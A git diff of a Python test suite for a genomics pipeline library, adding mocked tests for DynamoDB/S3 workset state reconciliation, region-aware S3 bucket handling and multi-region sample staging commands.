@@ -4,17 +4,12 @@ Tests the integration layer that synchronizes DynamoDB state management
 with S3 sentinel-based processing system.
 """
 
-import datetime as dt
-import json
-from unittest.mock import MagicMock, patch, call
+from unittest.mock import MagicMock, patch
 
 import pytest
 
 from daylib.workset_integration import (
     WorksetIntegration,
-    SENTINEL_FILES,
-    WORK_YAML_NAME,
-    INFO_YAML_NAME,
 )
 
 
@@ -98,10 +93,10 @@ class TestWorksetIntegrationInit:
         assert integration.prefix == "data/worksets/"
 
     def test_init_creates_s3_client_if_not_provided(self, mock_state_db):
-        """Test initialization creates S3 client if not provided."""
-        with patch("daylib.workset_integration.boto3") as mock_boto3:
-            mock_session = MagicMock()
-            mock_boto3.Session.return_value = mock_session
+        """Test initialization creates RegionAwareS3Client if not provided."""
+        with patch("daylib.workset_integration.RegionAwareS3Client") as mock_client_class:
+            mock_client = MagicMock()
+            mock_client_class.return_value = mock_client
 
             integration = WorksetIntegration(
                 state_db=mock_state_db,
@@ -109,8 +104,11 @@ class TestWorksetIntegrationInit:
                 region="us-east-1",
             )
 
-            mock_boto3.Session.assert_called_once_with(region_name="us-east-1")
-            mock_session.client.assert_called_once_with("s3")
+            mock_client_class.assert_called_once_with(
+                default_region="us-east-1",
+                profile=None,
+            )
+            assert integration._s3 is mock_client
 
     def test_init_prefix_normalization(self, mock_state_db, mock_s3_client):
         """Test prefix is normalized with trailing slash."""
@@ -468,6 +466,222 @@ class TestMonitorWorksetExistenceCheck:
         mock_state_db_for_monitor.register_workset.assert_not_called()
 
 
+class TestMonitorReconcileDynamoDBState:
+    """Tests for monitor's DynamoDB/S3 state reconciliation on restart.
+
+    These tests verify that when the monitor restarts after a crash
+    (mid-SSH failure), it correctly reconciles DynamoDB state with
+    S3 sentinel files.
+    """
+
+    @pytest.fixture
+    def mock_monitor_for_reconciliation(self):
+        """Create a mock monitor for reconciliation tests."""
+        from daylib.workset_monitor import WorksetMonitor, SENTINEL_FILES
+
+        monitor = WorksetMonitor.__new__(WorksetMonitor)
+        monitor.state_db = MagicMock()
+        monitor.dry_run = False
+        return monitor, SENTINEL_FILES
+
+    def test_reconcile_updates_dynamodb_when_s3_shows_complete(self, mock_monitor_for_reconciliation):
+        """Test that DynamoDB is updated when S3 shows complete but DynamoDB shows in_progress."""
+        from daylib.workset_monitor import Workset
+
+        monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
+
+        # S3 shows complete, DynamoDB shows in_progress
+        workset = Workset(
+            name="test-ws-001",
+            prefix="worksets/test-ws-001/",
+            sentinels={SENTINEL_FILES["complete"]: "2024-01-15T10:00:00Z"},
+            has_required_files=True,
+            is_archived=False,
+        )
+        monitor.state_db.get_workset.return_value = {
+            "workset_id": "test-ws-001",
+            "state": "in_progress",
+        }
+
+        monitor._reconcile_dynamodb_state(workset)
+
+        # Verify DynamoDB state was updated to complete
+        monitor.state_db.update_state.assert_called_once()
+        call_kwargs = monitor.state_db.update_state.call_args.kwargs
+        assert call_kwargs["workset_id"] == "test-ws-001"
+        assert "Reconciled" in call_kwargs["reason"]
+
+    def test_reconcile_updates_dynamodb_when_s3_shows_error(self, mock_monitor_for_reconciliation):
+        """Test that DynamoDB is updated when S3 shows error but DynamoDB shows ready."""
+        from daylib.workset_monitor import Workset
+
+        monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
+
+        # S3 shows error, DynamoDB shows ready
+        workset = Workset(
+            name="test-ws-002",
+            prefix="worksets/test-ws-002/",
+            sentinels={SENTINEL_FILES["error"]: "2024-01-15T10:00:00Z\tFailed"},
+            has_required_files=True,
+            is_archived=False,
+        )
+        monitor.state_db.get_workset.return_value = {
+            "workset_id": "test-ws-002",
+            "state": "ready",
+        }
+
+        monitor._reconcile_dynamodb_state(workset)
+
+        # Verify DynamoDB state was updated to error
+        monitor.state_db.update_state.assert_called_once()
+        call_kwargs = monitor.state_db.update_state.call_args.kwargs
+        assert call_kwargs["workset_id"] == "test-ws-002"
+
+    def test_reconcile_does_not_overwrite_terminal_dynamodb_state(self, mock_monitor_for_reconciliation):
+        """Test that terminal states in DynamoDB are not overwritten."""
+        from daylib.workset_monitor import Workset
+
+        monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
+
+        # DynamoDB already shows complete (terminal state)
+        workset = Workset(
+            name="test-ws-003",
+            prefix="worksets/test-ws-003/",
+            sentinels={SENTINEL_FILES["error"]: "2024-01-15T10:00:00Z"},
+            has_required_files=True,
+            is_archived=False,
+        )
+        monitor.state_db.get_workset.return_value = {
+            "workset_id": "test-ws-003",
+            "state": "complete",
+        }
+
+        monitor._reconcile_dynamodb_state(workset)
+
+        # update_state should NOT be called for terminal states
+        monitor.state_db.update_state.assert_not_called()
+
+    def test_reconcile_updates_ready_to_in_progress(self, mock_monitor_for_reconciliation):
+        """Test that DynamoDB is updated from ready to in_progress when S3 shows in_progress."""
+        from daylib.workset_monitor import Workset
+
+        monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
+
+        # S3 shows in_progress, DynamoDB shows ready
+        workset = Workset(
+            name="test-ws-004",
+            prefix="worksets/test-ws-004/",
+            sentinels={
+                SENTINEL_FILES["ready"]: "2024-01-15T09:00:00Z",
+                SENTINEL_FILES["in_progress"]: "2024-01-15T10:00:00Z",
+            },
+            has_required_files=True,
+            is_archived=False,
+        )
+        monitor.state_db.get_workset.return_value = {
+            "workset_id": "test-ws-004",
+            "state": "ready",
+        }
+
+        monitor._reconcile_dynamodb_state(workset)
+
+        # Verify DynamoDB state was updated to in_progress
+        monitor.state_db.update_state.assert_called_once()
+
+    def test_reconcile_skips_workset_not_in_dynamodb(self, mock_monitor_for_reconciliation):
+        """Test that reconciliation is skipped for worksets not in DynamoDB."""
+        from daylib.workset_monitor import Workset
+
+        monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
+
+        # Workset exists in S3 but not in DynamoDB
+        workset = Workset(
+            name="orphan-ws",
+            prefix="worksets/orphan-ws/",
+            sentinels={SENTINEL_FILES["complete"]: "2024-01-15T10:00:00Z"},
+            has_required_files=True,
+            is_archived=False,
+        )
+        monitor.state_db.get_workset.return_value = None
+
+        monitor._reconcile_dynamodb_state(workset)
+
+        # update_state should NOT be called - monitor doesn't create worksets
+        monitor.state_db.update_state.assert_not_called()
+
+    def test_reconcile_skips_when_no_state_db(self, mock_monitor_for_reconciliation):
+        """Test that reconciliation is skipped when no state_db is configured."""
+        from daylib.workset_monitor import Workset
+
+        monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
+        monitor.state_db = None  # No state DB
+
+        workset = Workset(
+            name="test-ws-005",
+            prefix="worksets/test-ws-005/",
+            sentinels={SENTINEL_FILES["complete"]: "2024-01-15T10:00:00Z"},
+            has_required_files=True,
+            is_archived=False,
+        )
+
+        # Should not raise, just return early
+        monitor._reconcile_dynamodb_state(workset)
+
+    def test_reconcile_handles_update_failure_gracefully(self, mock_monitor_for_reconciliation):
+        """Test that reconciliation handles DynamoDB update failures gracefully."""
+        from daylib.workset_monitor import Workset
+
+        monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
+
+        workset = Workset(
+            name="test-ws-006",
+            prefix="worksets/test-ws-006/",
+            sentinels={SENTINEL_FILES["complete"]: "2024-01-15T10:00:00Z"},
+            has_required_files=True,
+            is_archived=False,
+        )
+        monitor.state_db.get_workset.return_value = {
+            "workset_id": "test-ws-006",
+            "state": "in_progress",
+        }
+        monitor.state_db.update_state.side_effect = Exception("DynamoDB error")
+
+        # Should not raise, just log warning
+        monitor._reconcile_dynamodb_state(workset)
+
+    def test_reconcile_called_during_check_workset_state(self, mock_monitor_for_reconciliation):
+        """Test that reconciliation is called during _check_workset_state."""
+        from daylib.workset_monitor import Workset
+
+        monitor, SENTINEL_FILES = mock_monitor_for_reconciliation
+
+        # Setup monitor with additional required attributes
+        monitor._process_directories = None
+        monitor.attempt_restart = False
+
+        # Create workset with complete sentinel
+        workset = Workset(
+            name="test-ws-007",
+            prefix="worksets/test-ws-007/",
+            sentinels={SENTINEL_FILES["complete"]: "2024-01-15T10:00:00Z"},
+            has_required_files=True,
+            is_archived=False,
+        )
+        monitor.state_db.get_workset.return_value = {
+            "workset_id": "test-ws-007",
+            "state": "in_progress",
+        }
+
+        # _check_workset_state should call reconcile before other checks
+        result = monitor._check_workset_state(workset)
+
+        # Reconcile should have been called
+        monitor.state_db.get_workset.assert_called()
+
+        # Result should be False (complete workset is skipped)
+        assert result is False
+
+
 class TestMonitorConcurrentProcessing:
     """Tests for monitor's concurrent workset processing."""
 
@@ -726,7 +940,7 @@ class TestCollectPostExportMetrics:
         monitor.state_db = MagicMock()
         monitor.dry_run = False
         monitor.debug = False
-        monitor.s3_client = MagicMock()
+        monitor._s3 = MagicMock()  # Use _s3 (RegionAwareS3Client attribute)
         monitor.config = MagicMock()
         monitor.config.aws.region = "us-east-1"
         monitor.config.aws.profile = None
@@ -739,7 +953,7 @@ class TestCollectPostExportMetrics:
 
         # Mock S3 paginator response with files totaling ~14GB
         mock_paginator = MagicMock()
-        mock_monitor.s3_client.get_paginator.return_value = mock_paginator
+        mock_monitor._s3.get_paginator.return_value = mock_paginator
         mock_paginator.paginate.return_value = [
             {
                 "Contents": [
@@ -778,7 +992,7 @@ class TestCollectPostExportMetrics:
 
         # Mock S3 paginator response with CRAM files
         mock_paginator = MagicMock()
-        mock_monitor.s3_client.get_paginator.return_value = mock_paginator
+        mock_monitor._s3.get_paginator.return_value = mock_paginator
         mock_paginator.paginate.return_value = [
             {
                 "Contents": [
@@ -1084,3 +1298,2565 @@ class TestUpdateExecutionEnvironmentHeadnodePath:
         assert ":exec_cluster" in expr_values
         assert ":exec_ip" in expr_values
         assert ":analysis_path" in expr_values
+
+
+class TestStageReferenceBucket:
+    """Tests for _stage_reference_bucket region substitution."""
+
+    @pytest.fixture
+    def mock_monitor(self):
+        """Create a mock monitor with config for testing."""
+        from daylib.workset_monitor import WorksetMonitor
+
+        monitor = WorksetMonitor.__new__(WorksetMonitor)
+        monitor.config = MagicMock()
+        return monitor
+
+    def test_returns_configured_bucket_without_region(self, mock_monitor):
+        """Test that configured bucket is returned as-is when no region specified."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://my-bucket/"
+
+        result = mock_monitor._stage_reference_bucket()
+
+        assert result == "s3://my-bucket/"
+
+    def test_adds_trailing_slash(self, mock_monitor):
+        """Test that trailing slash is added if missing."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://my-bucket"
+
+        result = mock_monitor._stage_reference_bucket()
+
+        assert result == "s3://my-bucket/"
+
+    def test_substitutes_region_placeholder(self, mock_monitor):
+        """Test that {region} placeholder is substituted."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://bucket-{region}/"
+
+        result = mock_monitor._stage_reference_bucket(region="eu-central-1")
+
+        assert result == "s3://bucket-eu-central-1/"
+
+    def test_substitutes_region_suffix_us_west_2_to_eu_central_1(self, mock_monitor):
+        """Test region suffix substitution from us-west-2 to eu-central-1."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://lsmc-dayoa-omics-analysis-us-west-2/"
+
+        result = mock_monitor._stage_reference_bucket(region="eu-central-1")
+
+        assert result == "s3://lsmc-dayoa-omics-analysis-eu-central-1/"
+
+    def test_substitutes_region_suffix_eu_central_1_to_us_west_2(self, mock_monitor):
+        """Test region suffix substitution from eu-central-1 to us-west-2."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://lsmc-dayoa-omics-analysis-eu-central-1/"
+
+        result = mock_monitor._stage_reference_bucket(region="us-west-2")
+
+        assert result == "s3://lsmc-dayoa-omics-analysis-us-west-2/"
+
+    def test_substitutes_region_suffix_us_east_1(self, mock_monitor):
+        """Test region suffix substitution to us-east-1."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://bucket-us-west-2/"
+
+        result = mock_monitor._stage_reference_bucket(region="us-east-1")
+
+        assert result == "s3://bucket-us-east-1/"
+
+    def test_substitutes_region_suffix_ap_south_1(self, mock_monitor):
+        """Test region suffix substitution to ap-south-1."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://bucket-us-west-2/"
+
+        result = mock_monitor._stage_reference_bucket(region="ap-south-1")
+
+        assert result == "s3://bucket-ap-south-1/"
+
+    def test_no_substitution_when_region_matches(self, mock_monitor):
+        """Test no substitution when target region matches bucket region."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://bucket-us-west-2/"
+
+        result = mock_monitor._stage_reference_bucket(region="us-west-2")
+
+        assert result == "s3://bucket-us-west-2/"
+
+    def test_no_substitution_for_non_regional_bucket(self, mock_monitor):
+        """Test no substitution for bucket without region suffix."""
+        mock_monitor.config.pipeline.reference_bucket = "s3://my-generic-bucket/"
+
+        result = mock_monitor._stage_reference_bucket(region="eu-central-1")
+
+        assert result == "s3://my-generic-bucket/"
+
+    def test_raises_error_when_not_configured(self, mock_monitor):
+        """Test MonitorError raised when reference_bucket not configured."""
+        from daylib.workset_monitor import MonitorError
+
+        mock_monitor.config.pipeline.reference_bucket = None
+
+        with pytest.raises(MonitorError, match="pipeline.reference_bucket must be configured"):
+            mock_monitor._stage_reference_bucket()
+
+    def test_raises_error_for_empty_string(self, mock_monitor):
+        """Test MonitorError raised for empty string."""
+        from daylib.workset_monitor import MonitorError
+
+        mock_monitor.config.pipeline.reference_bucket = ""
+
+        with pytest.raises(MonitorError, match="pipeline.reference_bucket must be configured"):
+            mock_monitor._stage_reference_bucket()
+
+
+class TestStageSamplesMultiRegion:
+    """Tests for _stage_samples multi-region support."""
+
+    @pytest.fixture
+    def mock_monitor(self):
+        """Create a mock monitor with required attributes for staging."""
+        from daylib.workset_monitor import WorksetMonitor
+        import tempfile
+        from pathlib import Path
+
+        monitor = WorksetMonitor.__new__(WorksetMonitor)
+        monitor.config = MagicMock()
+        monitor.config.aws.profile = "test-profile"
+        monitor.config.aws.region = "us-west-2"
+        monitor.config.pipeline.reference_bucket = "s3://bucket-us-west-2/"
+        monitor.config.pipeline.stage_command = (
+            "./bin/stage --profile {profile} --region {region} "
+            "--reference-bucket {reference_bucket} --config-dir {output_dir} {analysis_samples}"
+        )
+        monitor.config.pipeline.ssh_identity_file = "~/.ssh/key.pem"
+        monitor.config.pipeline.ssh_user = "ubuntu"
+        monitor.config.pipeline.ssh_extra_args = []
+
+        # Mock methods
+        monitor._stage_artifacts = {}
+        monitor._relative_manifest_argument = MagicMock(return_value="manifest.tsv")
+
+        # Use temp directory for output
+        tmpdir = tempfile.mkdtemp()
+        monitor._local_state_dir = MagicMock(return_value=Path(tmpdir))
+
+        return monitor
+
+    def test_uses_cluster_region_in_command(self, mock_monitor):
+        """Test that cluster region is used in staging command."""
+        mock_monitor._run_monitored_command = MagicMock()
+        mock_monitor._run_monitored_command.return_value = MagicMock(
+            stdout="Remote FSx stage directory: /fsx/data/staged/remote_stage_123\nStaged files (1):\n  /fsx/data/staged/remote_stage_123/sample.fq.gz",
+            stderr="",
+        )
+        mock_monitor._parse_stage_samples_output = MagicMock()
+
+        workset = MagicMock()
+        workset.name = "test-workset"
+        manifest_path = MagicMock()
+
+        mock_monitor._stage_samples(workset, manifest_path, "euc1a-jem", region="eu-central-1")
+
+        # Verify the command was called with correct region
+        call_args = mock_monitor._run_monitored_command.call_args
+        cmd = call_args[0][1]  # Second positional arg is the command string
+
+        assert "--region eu-central-1" in cmd
+        assert "--reference-bucket s3://bucket-eu-central-1/" in cmd
+
+    def test_uses_config_region_when_none_provided(self, mock_monitor):
+        """Test that config region is used when no region parameter provided."""
+        mock_monitor._run_monitored_command = MagicMock()
+        mock_monitor._run_monitored_command.return_value = MagicMock(stdout="", stderr="")
+        mock_monitor._parse_stage_samples_output = MagicMock()
+
+        workset = MagicMock()
+        workset.name = "test-workset"
+        manifest_path = MagicMock()
+
+        mock_monitor._stage_samples(workset, manifest_path, "usw2d-B", region=None)
+
+        call_args = mock_monitor._run_monitored_command.call_args
+        cmd = call_args[0][1]
+
+        assert "--region us-west-2" in cmd
+        assert "--reference-bucket s3://bucket-us-west-2/" in cmd
+
+    def test_different_regions_produce_different_commands(self, mock_monitor):
+        """Test that different regions produce different staging commands."""
+        mock_monitor._run_monitored_command = MagicMock()
+        mock_monitor._run_monitored_command.return_value = MagicMock(stdout="", stderr="")
+        mock_monitor._parse_stage_samples_output = MagicMock()
+
+        workset = MagicMock()
+        workset.name = "test-workset"
+        manifest_path = MagicMock()
+
+        # Stage to us-west-2
+        mock_monitor._stage_samples(workset, manifest_path, "usw2d-B", region="us-west-2")
+        usw2_cmd = mock_monitor._run_monitored_command.call_args[0][1]
+
+        # Stage to eu-central-1
+        mock_monitor._stage_samples(workset, manifest_path, "euc1a-jem", region="eu-central-1")
+        euc1_cmd = mock_monitor._run_monitored_command.call_args[0][1]
+
+        # Stage to ap-south-1
+        mock_monitor._stage_samples(workset, manifest_path, "aps1-cluster", region="ap-south-1")
+        aps1_cmd = mock_monitor._run_monitored_command.call_args[0][1]
+
+        # Verify each has correct region
+        assert "--region us-west-2" in usw2_cmd
+        assert "--region eu-central-1" in euc1_cmd
+        assert "--region ap-south-1" in aps1_cmd
+
+        # Verify each has correct bucket
+        assert "bucket-us-west-2" in usw2_cmd
+        assert "bucket-eu-central-1" in euc1_cmd
+        assert "bucket-ap-south-1" in aps1_cmd
+
+
+# ========== Tests for Phase 1 bucket normalization fixes ==========
+
+
+class TestBucketNormalizationAtIngress:
+    """Test bucket names are normalized (s3:// prefix stripped) at all ingress points."""
+
+    def test_init_normalizes_bucket_with_s3_prefix(self, mock_state_db, mock_s3_client):
+        """Test __init__ normalizes bucket with s3:// prefix."""
+        integration = WorksetIntegration(
+            state_db=mock_state_db,
+            s3_client=mock_s3_client,
+            bucket="s3://my-bucket-with-prefix",
+            prefix="worksets/",
+        )
+        assert integration.bucket == "my-bucket-with-prefix"
+
+    def test_register_workset_normalizes_bucket_param(self, integration, mock_state_db, mock_s3_client):
+        """Test register_workset normalizes bucket parameter with s3:// prefix."""
+        result = integration.register_workset(
+            workset_id="test-ws-norm",
+            bucket="s3://bucket-with-prefix",
+            prefix="worksets/test/",
+            priority="normal",
+            metadata={"samples": []},
+            write_s3=False,
+            write_dynamodb=True,
+        )
+
+        assert result is True
+        call_kwargs = mock_state_db.register_workset.call_args.kwargs
+        assert call_kwargs["bucket"] == "bucket-with-prefix"
+
+    def test_update_state_normalizes_bucket_param(self, integration, mock_state_db, mock_s3_client):
+        """Test update_state normalizes bucket parameter with s3:// prefix."""
+        integration.update_state(
+            workset_id="test-ws-001",
+            new_state="in_progress",
+            reason="Starting processing",
+            bucket="s3://bucket-with-prefix",
+        )
+
+        # Should use normalized bucket for S3 operations
+        # The method writes sentinel to S3, check the put_object call
+        if mock_s3_client.put_object.called:
+            call_kwargs = mock_s3_client.put_object.call_args.kwargs
+            assert call_kwargs["Bucket"] == "bucket-with-prefix"
+
+    def test_acquire_lock_normalizes_bucket_param(self, integration, mock_state_db, mock_s3_client):
+        """Test acquire_lock normalizes bucket parameter with s3:// prefix."""
+        mock_state_db.acquire_lock.return_value = True
+
+        result = integration.acquire_lock(
+            workset_id="test-ws-001",
+            owner_id="test-processor",
+            bucket="s3://bucket-with-prefix",
+        )
+
+        assert result is True
+        # Verify S3 sentinel written to normalized bucket
+        if mock_s3_client.put_object.called:
+            call_kwargs = mock_s3_client.put_object.call_args.kwargs
+            assert call_kwargs["Bucket"] == "bucket-with-prefix"
+
+    def test_release_lock_normalizes_bucket_param(self, integration, mock_state_db, mock_s3_client):
+        """Test release_lock normalizes bucket parameter with s3:// prefix."""
+        mock_state_db.release_lock.return_value = True
+
+        result = integration.release_lock(
+            workset_id="test-ws-001",
+            owner_id="test-processor",
+            bucket="s3://bucket-with-prefix",
+        )
+
+        assert result is True
+
+    def test_sync_dynamodb_to_s3_normalizes_bucket_from_workset(
+        self, integration, mock_state_db, mock_s3_client
+    ):
+        """Test sync_dynamodb_to_s3 normalizes bucket from workset data."""
+        mock_state_db.get_workset.return_value = {
+            "workset_id": "sync-ws",
+            "state": "ready",
+            "bucket": "s3://bucket-with-prefix",  # Bucket with s3:// prefix
+            "prefix": "worksets/sync-ws/",
+            "metadata": {"samples": []},
+        }
+
+        result = integration.sync_dynamodb_to_s3("sync-ws")
+
+        assert result is True
+        # Verify S3 operations use normalized bucket
+        if mock_s3_client.put_object.called:
+            call_kwargs = mock_s3_client.put_object.call_args.kwargs
+            assert call_kwargs["Bucket"] == "bucket-with-prefix"
+
+    def test_bucket_with_path_components_normalized(self, mock_state_db, mock_s3_client):
+        """Test bucket with path components (s3://bucket/path) extracts just bucket."""
+        integration = WorksetIntegration(
+            state_db=mock_state_db,
+            s3_client=mock_s3_client,
+            bucket="s3://my-bucket/some/path",
+            prefix="worksets/",
+        )
+        assert integration.bucket == "my-bucket"
+
+    def test_bucket_without_prefix_unchanged(self, mock_state_db, mock_s3_client):
+        """Test bucket without s3:// prefix is unchanged."""
+        integration = WorksetIntegration(
+            state_db=mock_state_db,
+            s3_client=mock_s3_client,
+            bucket="plain-bucket-name",
+            prefix="worksets/",
+        )
+        assert integration.bucket == "plain-bucket-name"
+
+
+# ========== Tests for Phase 1 region threading fixes ==========
+
+
+class TestRegionThreadingInExportResults:
+    """Test region parameter is correctly threaded through _export_results."""
+
+    def test_export_results_uses_passed_region(self):
+        """Test _export_results uses passed region instead of config default."""
+        from daylib.workset_monitor import WorksetMonitor
+        from unittest.mock import MagicMock, patch
+        from pathlib import PurePosixPath, Path
+
+        # Create minimal monitor instance
+        monitor = WorksetMonitor.__new__(WorksetMonitor)
+        monitor.config = MagicMock()
+        monitor.config.aws.region = "us-west-2"  # Default region
+        monitor.config.aws.profile = None
+        monitor.config.pipeline.export_command = (
+            "echo cluster={cluster} region={region} target={target_uri}"
+        )
+        monitor._local_state_dir = MagicMock(return_value=Path("/tmp/test"))
+        monitor._resolve_workdir_name = MagicMock(return_value="test-workdir")
+        monitor._run_monitored_command = MagicMock()
+
+        # Mock workset
+        workset = MagicMock()
+        workset.name = "test-ws"
+        workset.bucket = "test-bucket"
+        workset.prefix = "worksets/test/"
+
+        # Mock Path.exists to return False (no fsx_export.yaml)
+        with patch.object(Path, "exists", return_value=False):
+            from daylib.workset_monitor import MonitorError
+            try:
+                monitor._export_results(
+                    workset=workset,
+                    cluster_name="test-cluster",
+                    target_uri="s3://export-bucket/results/",
+                    pipeline_dir=PurePosixPath("/fsx/pipeline"),
+                    region="eu-central-1",  # Pass EU region explicitly
+                )
+            except MonitorError:
+                pass  # Expected - no fsx_export.yaml
+
+        # Verify the command was called with EU region, not default US region
+        monitor._run_monitored_command.assert_called_once()
+        call_args = monitor._run_monitored_command.call_args
+        command = call_args[0][1]  # Second positional arg is the command
+        assert "region='eu-central-1'" in command or "region=eu-central-1" in command
+
+    def test_export_results_falls_back_to_config_region(self):
+        """Test _export_results falls back to config region when none passed."""
+        from daylib.workset_monitor import WorksetMonitor
+        from unittest.mock import MagicMock, patch
+        from pathlib import PurePosixPath, Path
+
+        monitor = WorksetMonitor.__new__(WorksetMonitor)
+        monitor.config = MagicMock()
+        monitor.config.aws.region = "us-west-2"
+        monitor.config.aws.profile = None
+        monitor.config.pipeline.export_command = (
+            "echo cluster={cluster} region={region} target={target_uri}"
+        )
+        monitor._local_state_dir = MagicMock(return_value=Path("/tmp/test"))
+        monitor._resolve_workdir_name = MagicMock(return_value="test-workdir")
+        monitor._run_monitored_command = MagicMock()
+
+        workset = MagicMock()
+        workset.name = "test-ws"
+        workset.bucket = "test-bucket"
+        workset.prefix = "worksets/test/"
+
+        with patch.object(Path, "exists", return_value=False):
+            from daylib.workset_monitor import MonitorError
+            try:
+                monitor._export_results(
+                    workset=workset,
+                    cluster_name="test-cluster",
+                    target_uri="s3://export-bucket/results/",
+                    pipeline_dir=PurePosixPath("/fsx/pipeline"),
+                    # No region passed - should use config default
+                )
+            except MonitorError:
+                pass
+
+        monitor._run_monitored_command.assert_called_once()
+        call_args = monitor._run_monitored_command.call_args
+        command = call_args[0][1]
+        assert "region='us-west-2'" in command or "region=us-west-2" in command
+
+
+class TestCleanupPipelineDirectoryRegion:
+    """Test region parameter is correctly threaded through _cleanup_pipeline_directory."""
+
+    def test_cleanup_pipeline_directory_passes_region(self):
+        """Test _cleanup_pipeline_directory passes region to headnode command."""
+        from daylib.workset_monitor import WorksetMonitor
+        from unittest.mock import MagicMock
+        from pathlib import PurePosixPath
+
+        monitor = WorksetMonitor.__new__(WorksetMonitor)
+        monitor._run_headnode_monitored_command = MagicMock()
+        monitor._clear_pipeline_location = MagicMock()
+
+        workset = MagicMock()
+        workset.name = "test-ws"
+
+        monitor._cleanup_pipeline_directory(
+            workset=workset,
+            cluster_name="test-cluster",
+            pipeline_dir=PurePosixPath("/fsx/pipeline/test"),
+            region="eu-central-1",
+        )
+
+        monitor._run_headnode_monitored_command.assert_called_once()
+        call_kwargs = monitor._run_headnode_monitored_command.call_args.kwargs
+        assert call_kwargs.get("region") == "eu-central-1"
+
+
+# ========== Tests for Phase 1H: RegionAwareS3Client ==========
+
+
+class TestRegionAwareS3Client:
+    """Tests for the RegionAwareS3Client that handles cross-region S3 operations."""
+
+    def test_normalize_bucket_name_strips_s3_prefix(self):
+        """Test that normalize_bucket_name strips s3:// prefix."""
+        from daylib.s3_utils import normalize_bucket_name
+
+        assert normalize_bucket_name("s3://my-bucket") == "my-bucket"
+        assert normalize_bucket_name("s3://my-bucket/") == "my-bucket"
+        assert normalize_bucket_name("my-bucket") == "my-bucket"
+        # Empty string returns None
+        assert normalize_bucket_name("") is None
+        assert normalize_bucket_name(None) is None
+
+    def test_client_initialization(self):
+        """Test RegionAwareS3Client initializes with default region."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+
+            assert client.default_region == "us-west-2"
+            # Verifies Session was called with region_name
+            mock_boto3.Session.assert_called_with(region_name="us-west-2")
+            mock_session.client.assert_called_with("s3")
+
+    def test_client_initialization_with_profile(self):
+        """Test RegionAwareS3Client initializes with AWS profile."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            client = RegionAwareS3Client(
+                default_region="eu-central-1",
+                profile="my-profile",
+            )
+
+            assert client.profile == "my-profile"
+            # Both region and profile are passed to Session
+            mock_boto3.Session.assert_called_with(
+                region_name="eu-central-1",
+                profile_name="my-profile"
+            )
+
+    def test_get_bucket_region_us_east_1_returns_none(self):
+        """Test that us-east-1 buckets return 'us-east-1' (GetBucketLocation returns None)."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            # GetBucketLocation returns None for us-east-1
+            mock_client.get_bucket_location.return_value = {"LocationConstraint": None}
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+            region = client.get_bucket_region("us-east-1-bucket")
+
+            assert region == "us-east-1"
+            mock_client.get_bucket_location.assert_called_once_with(Bucket="us-east-1-bucket")
+
+    def test_get_bucket_region_caches_result(self):
+        """Test that bucket region is cached after first lookup."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            mock_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+
+            # First call should query S3
+            region1 = client.get_bucket_region("eu-bucket")
+            assert region1 == "eu-central-1"
+            assert mock_client.get_bucket_location.call_count == 1
+
+            # Second call should use cache
+            region2 = client.get_bucket_region("eu-bucket")
+            assert region2 == "eu-central-1"
+            assert mock_client.get_bucket_location.call_count == 1  # No additional call
+
+    def test_get_bucket_region_normalizes_bucket_name(self):
+        """Test that bucket name is normalized before region lookup."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            mock_session = MagicMock()
+            mock_client = MagicMock()
+            mock_boto3.Session.return_value = mock_session
+            mock_session.client.return_value = mock_client
+
+            mock_client.get_bucket_location.return_value = {"LocationConstraint": "us-west-2"}
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+            client.get_bucket_region("s3://my-bucket-with-prefix")
+
+            mock_client.get_bucket_location.assert_called_once_with(Bucket="my-bucket-with-prefix")
+
+    def test_get_client_for_bucket_creates_regional_client(self):
+        """Test that get_client_for_bucket creates a client for bucket's region."""
+        from daylib.s3_utils import RegionAwareS3Client
+
+        with patch("daylib.s3_utils.boto3") as mock_boto3:
+            us_west_2_client = MagicMock(name="us-west-2-client")
+            eu_central_1_client = MagicMock(name="eu-central-1-client")
+
+            # Session is created with region_name kwarg, so we need to track that
+            def session_factory(region_name=None, profile_name=None):
+                mock_session = MagicMock()
+                if region_name == "eu-central-1":
+                    mock_session.client.return_value = eu_central_1_client
+                else:
+                    mock_session.client.return_value = us_west_2_client
+                return mock_session
+
+            mock_boto3.Session.side_effect = session_factory
+
+            # Default client is used for GetBucketLocation
+            us_west_2_client.get_bucket_location.return_value = {"LocationConstraint": "eu-central-1"}
+
+            client = RegionAwareS3Client(default_region="us-west-2")
+            regional_client = client.get_client_for_bucket("eu-bucket")
+
+            assert regional_client is eu_central_1_client
+
